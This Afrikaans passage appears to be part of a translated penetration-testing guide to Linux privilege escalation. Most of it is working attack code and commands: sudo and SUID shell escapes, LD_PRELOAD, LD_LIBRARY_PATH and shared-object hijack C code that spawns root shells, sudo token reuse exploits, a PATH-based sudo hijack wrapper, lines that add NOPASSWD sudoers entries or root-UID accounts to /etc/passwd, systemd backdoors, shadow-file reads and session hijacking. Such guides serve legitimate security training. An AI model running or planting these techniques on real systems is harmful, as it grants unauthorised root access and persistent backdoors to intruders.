Sommige Linux weergawes was geraak deur 'n fout wat gebruikers met **UID > INT_MAX** toelaat om voorregte te verhoog. Meer inligting: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) en [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Eksploiteer dit** met: **`systemd-run -t /bin/bash`**

### Groups

Kontroleer of jy 'n **lid van 'n groep** is wat jou root voorregte kan gee:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Kontroleer of daar iets interessant in die klembord is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

As jy **enige wagwoord** van die omgewing **ken, probeer om in te log as elke gebruiker** met die wagwoord.

### Su Brute

As jy nie omgee om baie geraas te maak nie en `su` en `timeout` binaire is op die rekenaar teenwoordig, kan jy probeer om gebruikers te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te brute-force.

## Skryfbare PATH misbruik

### $PATH

As jy vind dat jy **binne 'n sekere gids van die $PATH kan skryf**, mag jy in staat wees om voorregte te verhoog deur **'n agterdeur binne die skryfbare gids te skep** met die naam van 'n opdrag wat deur 'n ander gebruiker (root idealiter) uitgevoer gaan word en wat **nie gelaai word vanaf 'n gids wat voor jou skryfbare gids in $PATH geleë is nie**.

### SUDO en SUID

Jy mag toegelaat word om 'n sekere opdrag met sudo uit te voer of hulle mag die suid-biet hê. Kontroleer dit met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf of selfs 'n opdrag uit te voer.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-konfigurasie mag 'n gebruiker toelaat om 'n opdrag met 'n ander gebruiker se voorregte uit te voer sonder om die wagwoord te ken.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer, dit is nou triviaal om 'n shell te kry deur 'n ssh-sleutel in die root-gids te voeg of deur `sh` aan te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie riglyn laat die gebruiker toe om **'n omgewing veranderlike in te stel** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB-masjien Admirer**, was **kwulnerbaar** vir **PYTHONPATH-hijacking** om 'n arbitrêre python-biblioteek te laai terwyl die skrip as root uitgevoer word:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo uitvoering omseiling paaie

**Spring** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld in die sudoers-lêer: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
As 'n **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-opdrag/SUID-binary sonder opdragspad

As die **sudo-toestemming** aan 'n enkele opdrag gegee word **sonder om die pad te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit benut deur die PATH-variabele te verander.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binêre **'n ander opdrag uitvoer sonder om die pad daarna toe te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID binêre)**.

[Payload voorbeelde om uit te voer.](payloads-to-execute.md)

### SUID binêre met opdrag pad

As die **suid** binêre **'n ander opdrag uitvoer wat die pad spesifiseer**, kan jy probeer om 'n **funksie** te **eksporteer** wat die naam het van die opdrag wat die suid-lêer aanroep.

Byvoorbeeld, as 'n suid binêre _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die funksie te skep en dit te eksport.
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dan, wanneer jy die suid-binary aanroep, sal hierdie funksie uitgevoer word

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD** omgewing veranderlike word gebruik om een of meer gedeelde biblioteke (.so lêers) aan te dui wat deur die laaier gelaai moet word voordat alle ander, insluitend die standaard C biblioteek (`libc.so`). Hierdie proses staan bekend as die vooraflaai van 'n biblioteek.

Om egter die stelselsekuriteit te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral met **suid/sgid** uitvoerbare lêers, handhaaf die stelsel sekere voorwaardes:

- Die laaier ignoreer **LD_PRELOAD** vir uitvoerbare lêers waar die werklike gebruikers-ID (_ruid_) nie ooreenstem met die effektiewe gebruikers-ID (_euid_).
- Vir uitvoerbare lêers met suid/sgid, word slegs biblioteke in standaardpaaie wat ook suid/sgid is, vooraf gelaai.

Privilegie-eskalasie kan plaasvind as jy die vermoë het om opdragte met `sudo` uit te voer en die uitvoer van `sudo -l` die stelling **env_keep+=LD_PRELOAD** insluit. Hierdie konfigurasie laat die **LD_PRELOAD** omgewing veranderlike toe om te bly bestaan en erken te word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van arbitrêre kode met verhoogde privilige.
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dan **kompyleer dit** met:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Laastens, **verhoog privaathede** wat loop
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 'n Soortgelyke privesc kan misbruik word as die aanvaller die **LD_LIBRARY_PATH** omgewing veranderlike beheer, omdat hy die pad beheer waar biblioteke gesoek gaan word.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binêre – .so inspuiting

Wanneer jy 'n binêre met **SUID** regte teëkom wat ongewone voorkoms het, is dit 'n goeie praktyk om te verifieer of dit **.so** lêers korrek laai. Dit kan nagegaan word deur die volgende opdrag uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, om 'n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (Geen sodanige lêer of gids)"_ te ondervind, dui op 'n potensiaal vir uitbuiting.

Om dit te benut, sou 'n mens voortgaan deur 'n C-lêer te skep, sê _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, wanneer dit gecompileer en uitgevoer word, is daarop gemik om voorregte te verhoog deur lêer toestemmings te manipuleer en 'n skulp met verhoogde voorregte uit te voer.

Compileer die bogenoemde C-lêer in 'n gedeelde objek (.so) lêer met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Uiteindelik, die uitvoering van die geraakte SUID-binary behoort die exploit te aktiveer, wat moontlike stelselskompromie moontlik maak.

## Gedeelde Objekt Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nou dat ons 'n SUID-binary gevind het wat 'n biblioteek laai vanaf 'n gids waar ons kan skryf, kom ons skep die biblioteek in daardie gids met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy 'n fout kry soos
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
dit beteken dat die biblioteek wat jy gegenereer het 'n funksie moet hê wat `a_function_name` genoem word.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n saamgestelde lys van Unix-binaries wat deur 'n aanvaller benut kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde, maar vir gevalle waar jy **slegs argumente** in 'n opdrag kan inspuit.

Die projek versamel wettige funksies van Unix-binaries wat misbruik kan word om uit beperkte shells te breek, voorregte te verhoog of te handhaaf, lêers oor te dra, bind en omgekeerde shells te spawn, en ander post-exploitasie take te fasiliteer.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}

{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

As jy toegang tot `sudo -l` het, kan jy die hulpmiddel [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit vind hoe om enige sudo-reël te benut.

### Hergebruik van Sudo Tokens

In gevalle waar jy **sudo toegang** het, maar nie die wagwoord nie, kan jy voorregte verhoog deur **te wag vir 'n sudo-opdrag uitvoering en dan die sessietoken te kap**.

Vereistes om voorregte te verhoog:

- Jy het reeds 'n shell as gebruiker "_sampleuser_"
- "_sampleuser_" het **`sudo` gebruik** om iets in die **laaste 15min** uit te voer (per standaard is dit die duur van die sudo-token wat ons toelaat om `sudo` te gebruik sonder om enige wagwoord in te voer)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is toeganklik (jy moet dit kan oplaai)

(Jy kan tydelik `ptrace_scope` inskakel met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` of permanent `/etc/sysctl.d/10-ptrace.conf` aanpas en `kernel.yama.ptrace_scope = 0` stel)

As al hierdie vereistes nagekom word, **kan jy voorregte verhoog met:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Die **eerste exploit** (`exploit.sh`) sal die binêre `activate_sudo_token` in _/tmp_ skep. Jy kan dit gebruik om **die sudo-token in jou sessie te aktiveer** (jy sal nie outomaties 'n root shell kry nie, doen `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **tweede exploit** (`exploit_v2.sh`) sal 'n sh shell in _/tmp_ **besit deur root met setuid** skep
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Die **derde eksploit** (`exploit_v3.sh`) sal **n sudoers-lêer skep** wat **sudo tokens ewigdurend maak en alle gebruikers toelaat om sudo te gebruik**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

As jy **skrywe toestemmings** in die gids of op enige van die geskepte lêers binne die gids het, kan jy die binêre [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om 'n **sudo-token vir 'n gebruiker en PID** te **skep**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het 'n shell as daardie gebruiker met PID 1234, kan jy **sudo-regte verkry** sonder om die wagwoord te ken deur:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` konfigureer wie `sudo` kan gebruik en hoe. Hierdie lêers **is standaard slegs leesbaar deur gebruiker root en groep root**.\
**As** jy hierdie lêer kan **lees**, kan jy dalk **interessante inligting verkry**, en as jy enige lêer kan **skryf**, sal jy in staat wees om **privileges te verhoog**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Nog 'n manier om hierdie toestemmings te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is 'n paar alternatiewe vir die `sudo` binêre soos `doas` vir OpenBSD, onthou om sy konfigurasie by `/etc/doas.conf` te kontroleer.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

As jy weet dat 'n **gebruiker gewoonlik aan 'n masjien koppel en `sudo` gebruik** om voorregte te verhoog en jy het 'n shell binne daardie gebruikerskonteks, kan jy **'n nuwe sudo uitvoerbare lêer skep** wat jou kode as root sal uitvoer en dan die gebruiker se opdrag. Dan, **wysig die $PATH** van die gebruikerskonteks (byvoorbeeld deur die nuwe pad in .bash_profile by te voeg) sodat wanneer die gebruiker sudo uitvoer, jou sudo uitvoerbare lêer uitgevoer word.

Let daarop dat as die gebruiker 'n ander shell gebruik (nie bash nie) jy ander lêers moet wysig om die nuwe pad by te voeg. Byvoorbeeld[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan 'n ander voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Of om iets soos te loop:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gedeelde Biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waar die gelaaide konfigurasielêers vandaan kom**. Tipies bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers van `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waar **biblioteke** gaan **soek** word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel biblioteke binne `/usr/local/lib` gaan soek**.

As om een of ander rede **'n gebruiker skryfregte** op enige van die aangeduide pades het: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasielêer binne `/etc/ld.so.conf.d/*.conf`, kan hy dalk in staat wees om voorregte te verhoog.\
Kyk na **hoe om hierdie miskonfigurasie te benut** op die volgende bladsy:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib in `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word soos gespesifiseer in die `RPATH` veranderlike.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Dan skep 'n bose biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Vermoëns

Linux vermoëns bied 'n **substel van die beskikbare wortelprivileges aan 'n proses**. Dit breek effektief wortel **privileges in kleiner en kenmerkende eenhede** op. Elke eenheid kan dan onafhanklik aan prosesse toegeken word. Op hierdie manier word die volle stel privileges verminder, wat die risiko's van uitbuiting verlaag.\
Lees die volgende bladsy om **meer te leer oor vermoëns en hoe om dit te misbruik**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Gids toestemmings

In 'n gids impliseer die **bit vir "uitvoer"** dat die betrokke gebruiker kan "**cd**" in die vouer.\
Die **"lees"** bit impliseer dat die gebruiker kan **lys** die **lêers**, en die **"skryf"** bit impliseer dat die gebruiker kan **verwyder** en **skep** nuwe **lêers**.

## ACLs

Toegang Beheer Lyste (ACLs) verteenwoordig die sekondêre laag van diskresionêre toestemmings, wat in staat is om **die tradisionele ugo/rwx toestemmings te oorskry**. Hierdie toestemmings verbeter beheer oor lêer of gids toegang deur regte aan spesifieke gebruikers toe te laat of te weier wat nie die eienaars of deel van die groep is nie. Hierdie vlak van **fynheid verseker meer presiese toegang bestuur**. Verdere besonderhede kan gevind word [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gee** gebruiker "kali" lees- en skryftoestemmings oor 'n lêer:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACLs van die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

In **ou weergawe** kan jy **hijack** sommige **shell** sessies van 'n ander gebruiker (**root**).\
In **nuutste weergawes** sal jy in staat wees om slegs na skermsessies van **jou eie gebruiker** te **verbinde**. Jy kan egter **interessante inligting binne die sessie** vind.

### screen sessions hijacking

**Lys skermsessies**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Koppel aan 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessies oorname

Dit was 'n probleem met **ou tmux weergawes**. Ek kon nie 'n tmux (v2.1) sessie wat deur root geskep is, oorneem as 'n nie-privilegieerde gebruiker nie.

**Lys tmux sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Koppel aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Kontroleer **Valentine box van HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Voorspelbare PRNG - CVE-2008-0166

Alle SSL en SSH sleutels wat op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, ens.) tussen September 2006 en 13 Mei 2008 gegenereer is, mag deur hierdie fout geraak word.\
Hierdie fout word veroorsaak wanneer 'n nuwe ssh-sleutel in daardie OS geskep word, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **as jy die ssh publieke sleutel het, kan jy soek na die ooreenstemmende private sleutel**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante konfigurasiewaarde

- **PasswordAuthentication:** Gee aan of wagwoordverifikasie toegelaat word. Die standaard is `no`.
- **PubkeyAuthentication:** Gee aan of publieke sleutelverifikasie toegelaat word. Die standaard is `yes`.
- **PermitEmptyPasswords**: Wanneer wagwoordverifikasie toegelaat word, gee dit aan of die bediener aanmeldings met leë wagwoordstringe toelaat. Die standaard is `no`.

### PermitRootLogin

Gee aan of root kan aanmeld met ssh, die standaard is `no`. Moontlike waardes:

- `yes`: root kan aanmeld met wagwoord en private sleutel
- `without-password` of `prohibit-password`: root kan slegs aanmeld met 'n private sleutel
- `forced-commands-only`: Root kan slegs aanmeld met 'n private sleutel en as die opdragopsies gespesifiseer is
- `no` : geen

### AuthorizedKeysFile

Gee aan watter lêers die publieke sleutels bevat wat vir gebruikersverifikasie gebruik kan word. Dit kan tokens soos `%h` bevat, wat deur die tuisgids vervang sal word. **Jy kan absolute paaie aandui** (begin in `/`) of **relatiewe paaie vanaf die gebruiker se huis**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Die konfigurasie sal aandui dat as jy probeer om in te log met die **private** sleutel van die gebruiker "**testusername**", ssh die publieke sleutel van jou sleutel met die een wat in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access` geleë is, gaan vergelyk.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding laat jou toe om **jou plaaslike SSH sleutels te gebruik in plaas van om sleutels** (sonder wagwoorde!) op jou bediener te laat sit. So, jy sal in staat wees om **te spring** via ssh **na 'n gasheer** en van daar **na 'n ander** gasheer **te spring** **met** die **sleutel** wat in jou **begin gasheer** geleë is.

Jy moet hierdie opsie in `$HOME/.ssh.config` soos volg stel:
```
Host example.com
ForwardAgent yes
```
Let wel dat as `Host` `*` is, elke keer as die gebruiker na 'n ander masjien spring, daardie host toegang tot die sleutels sal hê (wat 'n sekuriteitskwessie is).

Die lêer `/etc/ssh_config` kan **oorskry** hierdie **opsies** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan **toelaat** of **weier** ssh-agent forwarding met die sleutelwoord `AllowAgentForwarding` (standaard is toelaat).

As jy vind dat Forward Agent in 'n omgewing geconfigureer is, lees die volgende bladsy as **jy dalk in staat is om dit te misbruik om voorregte te verhoog**:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Lêers

### Profiel lêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **scripts wat uitgevoer word wanneer 'n gebruiker 'n nuwe skulp uitvoer**. Daarom, as jy **kan skryf of enige van hulle kan wysig, kan jy voorregte verhoog**.
```bash
ls -l /etc/profile /etc/profile.d/
```
As daar enige vreemde profielskrip gevind word, moet jy dit nagaan vir **sensitiewe besonderhede**.

### Passwd/Shadow Lêers

Afhangende van die OS mag die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam gebruik of daar mag 'n rugsteun wees. Daarom word dit aanbeveel om **almal van hulle te vind** en **na te gaan of jy hulle kan lees** om te sien **of daar hashes** binne die lêers is:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **wagwoord-hashes** binne die `/etc/passwd` (of ekwivalente) lêer vind
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbare /etc/passwd

Eerstens, genereer 'n wagwoord met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Voeg dan die gebruiker `hacker` by en voeg die gegenereerde wagwoord by.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su` opdrag gebruik met `hacker:hacker`

Alternatiewelik kan jy die volgende lyne gebruik om 'n dummy gebruiker sonder 'n wagwoord by te voeg.\
WAARSKUWING: jy mag die huidige sekuriteit van die masjien verlaag.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
LET WET: In BSD platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is die `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy moet nagaan of jy **in sommige sensitiewe lêers kan skryf**. Byvoorbeeld, kan jy in 'n **dienskonfigurasielêer** skryf?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, as die masjien 'n **tomcat** bediener draai en jy kan **die Tomcat diens konfigurasie lêer binne /etc/systemd/ wysig,** dan kan jy die lyne wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou backdoor sal uitgevoer word die volgende keer dat tomcat begin.

### Kontroleer Gidsen

Die volgende gidse mag rugsteun of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie die laaste een kan lees nie, maar probeer)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Vreemde Ligging/Eienaar lêers
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in laaste minute
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_geskiedenis, .sudo_as_admin_suksesvol, profiel, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteekte lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web lêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteun**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek na **verskeie moontlike lêers wat wagwoorde kan bevat**.\
